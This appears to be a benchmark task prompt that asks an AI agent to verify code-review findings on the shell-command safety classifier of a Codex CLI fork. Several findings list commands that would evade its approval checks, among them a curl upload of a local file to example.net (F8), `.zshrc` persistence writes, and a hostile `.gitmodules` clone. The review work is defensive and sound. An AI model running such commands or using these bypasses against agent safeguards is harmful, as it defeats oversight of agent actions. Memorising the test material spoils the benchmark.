@@ -1,0 +1,154 @@
+LOCAL ONLY: do not git push, do not use gh to create/edit/comment/review/merge anything, do not contact contributors.
+
+You are checking review findings from code reviews of CorbanuTerminal changes (a security-focused fork of the OpenAI Codex CLI; Rust under codex-rs/). For each finding below, decide from the code whether the claimed defect is REAL (the described behaviour actually happens in the reviewed code and is a genuine problem), FALSE (it does not happen, or is not a problem), or UNCERTAIN (cannot be settled by reading). Each finding names a read-only checkout and the diff range under review. Read the code there; do not use the network or GitHub, do not build or run anything, and do not open any other paths.
+
+For each finding answer one line in exactly this form, then a 1-3 sentence reason:
+F<n>: REAL|FALSE|UNCERTAIN; fair severity: critical|high|medium|low|nit
+
+
+---
+### F1 (case A06: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a06, diff aa35e3f93658aacd7483040f71f354010ac9c23a..HEAD)
+
+Medium — New integration test is not Windows-compatible — `codex-rs/core/tests/suite/issue_1139.rs:57`  
+   The test runs on Windows but invokes POSIX `printf` through the default PowerShell shell. On systems without GNU `printf`, it fails without the expected denial warning, breaking the assertions. Gate the test to macOS/Linux, as neighboring sandbox tests do, or provide a Windows-compatible command and fixture.
+
+
+---
+### F2 (case A04: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a04, diff c7940995571530aacb20b9750c4bacec45eb3661..HEAD)
+
+Medium (compatibility): a managed provider requirement can now block startup on an inherited model
+Where: `mod.rs:5002-5014` together with `5091-5123`
+
+What is wrong: `required_model_provider` now sets `requested_provider_was_explicit`, which feeds Corbanu's fail-closed check on model/provider pairs. The mixed-provenance fallback only fires when `provider_came_from_override` is true, and a required provider does not count as an override.
+
+Scenario (inferred, not run): an admin requirement forces `model_provider = "anthropic"`, and the user's `config.toml` has `model = "gpt-5.5"` with no provider. I expect startup to fail with "explicit model/provider pair … is incompatible" instead of falling back with a warning. The provider came from requirements and the model from the file, which is exactly the mixed provenance the comment says should fall back.
+
+Fix: treat a required provider like a runtime override for the fallback:
+```rust
+|| ((provider_came_from_override || required_model_provider.is_some()) && !model_came_from_override && cfg.model.is_some())
+```
+(Capture `is_some()` before the value is moved.) Add a test for this case.
+
+### Checked and fine
+- The remaining `forced_login_method` impl.
+- Dropping the multi-agent hint constants and `apply_managed_filesystem_constraints`; deny-read is now covered by `managed_deny_read_policy`.
+- `GlobPattern { scan: None, ... }` in `permissions.rs`.
+- The `allow_local_binding` guard in `network_proxy_spec.rs`.
+- The `managed_auth_policy` field.
+- The restored #2003 Windows startup notice.
+- The `rebuild_preserving_session_layers` rewrite.
+- `explicit_feature_setting` collecting its iterator.
+
+
+---
+### F3 (case A01: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01, diff 2cfd034860f792d0c3605b40437a3e21e29b361e..HEAD)
+
+Medium — `tainted_action_chroot_tests.rs:13`: No dispatch-level integration coverage.  
+   All added tests call the classifier directly. They cannot verify that a protected chroot action actually requires approval or is refused before execution. Core policy explicitly requires integration coverage for agent-logic changes. Fix: add `test_codex` cases establishing taint and asserting approval/refusal before dispatch, plus a harmless control and regressions for the gaps above.
+
+
+---
+### F4 (case A10: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a10, diff ed7a63783862a2a4180196ea04d1797fdfadcee8..HEAD)
+
+High — File allowlist disables Git’s submodule protection. `env.rs:197`  
+   `GIT_ALLOW_PROTOCOL=file` unconditionally permits file transport, overriding Git’s default `protocol.file.allow=user` restriction. A hostile `.gitmodules` pointing to a readable private local repository can now cause `git submodule update --init` to copy its objects into the workspace. Previously, Git rejected this automatic file clone; even a subsequent checkout failure can leave copied objects behind. Filesystem restrictions still apply. Fix: deny non-file transports while preserving Git’s user-only file policy, and test explicit clone success alongside automatic submodule rejection.
+
+
+---
+### F5 (case A05: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a05, diff 493f370ccf328840c4e052ceeffcda4e8dd132e9..HEAD)
+
+Low — a stuck keyword group now hides every later assignment
+`codex-rs/core/src/security/tainted_action/shell.rs:885-893`
+
+- What's wrong: `keyword_depth` now feeds `in_keyword`. If here-document text gets lexed as commands, a line starting with `for`, `if`, `while` and so on can open a keyword group that never closes, so every later assignment becomes unseen.
+- Example trigger:
+  ```
+  cat >n <<'EOF'
+  for now
+  EOF
+  r=origin; git fetch "$r"
+  ```
+  This would ask where it didn't before. It errs on the safe side (it asks), so it's only a usability cost; worth a test either way.
+
+The test file covers only the exact forms in the issue plus a few controls. The high and medium findings above are not covered.
+
+
+---
+### F6 (case A01: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01, diff 2cfd034860f792d0c3605b40437a3e21e29b361e..HEAD)
+
+Medium: `chroot` is found only as the plain command or directly after `eval`. Trivial rewordings still hide its command.
+- Where: `codex-rs/core/src/security/tainted_action.rs:2571-2577` and `:2606-2607`, together with `indirect.rs:807`.
+- What's wrong: chroots are looked for in only two places: in `programs(words)` (`from` 0) and right after `eval` (`operands = eval index + 1`). The classifier already handles other ways a line can carry a command. `carried_command` (around line 2775) handles `eval --`, `eval eval`, `trap`, `coproc` and `repeat`. `after_modifiers` handles zsh's `noglob`, `nocorrect` and `-`. The new chroot code checks neither.
+- Example: in `eval -- chroot / ./x`, `programs(["--","chroot",...])` returns `--` as the command. `chroot_commands` and `chroot_runs_unjudged` therefore never see the chroot. So these lines likely stay quiet, just as `chroot / ./x` was quiet before this change, while their plain forms now ask:
+  - `eval -- chroot / ./x`
+  - `eval eval chroot / ./x`
+  - `noglob chroot / ./x` (zsh)
+  - `trap 'chroot / ./x' EXIT`
+  - `coproc chroot / ./x`
+  - `eval -- chroot /tmp/r ls`, which also skips the new "another root" prompt
+- Fix: run `chroot_commands` and `chroot_runs_unjudged` from the start of each carried span and from the start after the zsh modifiers, not only from `eval index + 1`. This means computing `carried_command` and `after_modifiers` before the chroot block. Add these spellings to `issue1808_chroot_judges_its_command`.
+
+
+---
+### F7 (case A09: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a09, diff 8cb852fd53f0b3b96cb1b16f7c89f46dfb210bcb..HEAD)
+
+Nit — line 207: misleading error text. The `ScanError` message says "takes the guard but nothing calls it", which is wrong when the scan starts from `stage_windows_sandbox_helpers`. The `guard_users` docstring wording is also stale. Consider saying "reaches `{root}`" instead.
+
+
+---
+### F8 (case A01: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01, diff 2cfd034860f792d0c3605b40437a3e21e29b361e..HEAD)
+
+High — `tainted_action.rs:2593`: Reparsing erases unknown-value markers outside the narrow explicit checks.  
+   `words` already contains `UNSEEN_OUTPUT` placeholders. The recursive lexer replaces their control characters through `literal_char`, making them ordinary text. The explicit guard covers only the first word and inline interpreter code. Thus `chroot / curl --data-binary "$(cat /tmp/report)" https://example.net/upload` loses the marker that normally identifies disclosure. `chroot / env "$(cat tool-name)" /tmp/payload` likewise hides an unknown executable behind `env`. Fix: carry unseen flags through child classification and apply them to resolved command positions, operands, and outbound-data checks without reparsing away their provenance.
+
+
+---
+### F9 (case A05: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a05, diff 493f370ccf328840c4e052ceeffcda4e8dd132e9..HEAD)
+
+High — A redirection substitution defeats background-group tracking. `shell.rs:947`  
+   Input: `{ r=origin; } >$(printf log) & git fetch e"$r"`. Opening and closing the substitution clear `just_closed_group`, losing the assignments that `&` must mark. Because `printf log` has recognized literal output, it supplies no independent unseen-value warning. Fix: preserve the pending group range across substitutions belonging to its redirections, and cover this combination in the tests.
+
+
+---
+### F10 (case A06: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a06, diff aa35e3f93658aacd7483040f71f354010ac9c23a..HEAD)
+
+Nit — the `.git` check uses the outermost `.git` folder
+- Where: `moderate.rs:340-345`.
+- Problem: The loop keeps the last `.git` it meets, which is the one nearest the filesystem root. If a writable folder itself sits under a directory named `.git`, it looks at the wrong parent and misses the denial.
+- Fix: Accept the path if any `.git` ancestor's parent is writable.
+
+
+---
+### F11 (case A06: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a06, diff aa35e3f93658aacd7483040f71f354010ac9c23a..HEAD)
+
+Medium — the "switch to Permissive" advice is wrong when approvals are off
+- Where: `core/src/security/protected_reads/moderate.rs:378-388` (`git_write_explanation`); the advice is asserted at `core/tests/suite/issue_1139.rs:83` and `:180`.
+- Problem: Writing into `.git` is blocked by the person's own workspace-write sandbox, not by Moderate's protected-path rules. Switching to Permissive only helps if an approved command can then run outside the sandbox, which also depends on the approval policy:
+  - With `AskForApproval::Never`, a request to run outside the sandbox is refused (`orchestrator.rs:533`, `refused_approvals_off`).
+  - The same happens with Granular approvals when sandbox approval is disabled.
+- Why it's different from before: For the existing write warnings this advice holds, because Permissive drops Moderate's protected-path rules entirely. For a `.git` write it doesn't.
+- Scenario: The integration test itself: approvals set to `Never`, workspace-write, Moderate, then `git config user.name x`. The warning tells the person to switch to Permissive. After a restart into Permissive the same command fails the same way, and the person gets no explanation at all (the test asserts that).
+- Fix: Offer Permissive only when the approval policy lets a person approve a run outside the sandbox. Add that to the explanation inputs, or fall back to "run it in your own terminal" only. Add a test for the `Never` case.
+
+
+---
+### F12 (case A01: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01, diff 2cfd034860f792d0c3605b40437a3e21e29b361e..HEAD)
+
+High — `tainted_action.rs:2604`: `--skip-chdir` ignores directory changes made by outer wrappers.  
+   From `/work`, `env -C /home/fixture chroot --skip-chdir / cp /tmp/input .zshrc` writes `/home/fixture/.zshrc`. The new pass classifies `cp` in `/work`, because it strips the outer wrapper and uses `folders.cwd`. The original pass retains the directory option but treats `chroot` as the command, so it does not recognize the copy as a persistence write. Fix: propagate the effective wrapper directory, or classify relative child accesses conservatively when that directory cannot be established.
+
+
+---
+### F13 (case A01: checkout /Volumes/CorbanuDrive/Corbanu/.codex-work/bench-astra-20261114/wt/a01, diff 2cfd034860f792d0c3605b40437a3e21e29b361e..HEAD)
+
+Low–medium: with `--skip-chdir`, the chroot's command is checked as if it ran in a known folder.
+- Where: `tainted_action.rs:2597-2603`.
+- What's wrong: with `--skip-chdir`, the only check is `self.command(run, &folders.cwd, depth + 1)`. That inner check starts with fresh folder state, so it loses two kinds of information:
+  - The outer line's uncertainty about its folder (`folders.unseen`, `lost` and `unseen_in_substitution`).
+  - A folder set by a wrapper option before chroot (`env -C`, `sudo -D` or `--chdir`).
+- Example: `cd "$X" && cp x .zshrc` asks, but these are likely quiet because `.zshrc` is resolved against a known working folder:
+  - `cd "$X" && chroot --skip-chdir / cp x .zshrc`
+  - `sudo -D /home/fixture chroot --skip-chdir / tee -a .zshrc`
+- Fix: do what the nested-script reader does (`nested.rs:327`). Wrap the folder check in `self.unknown_folder += 1` / `-= 1` when the outer folder is uncertain or when `unknown_folder::elsewhere_at` finds a folder option before the chroot. Alternatively, have `skip_chdir` ask in those cases.
+
+End with the 13 lines F1..F13 collected again in a block starting with the line FINDINGS.
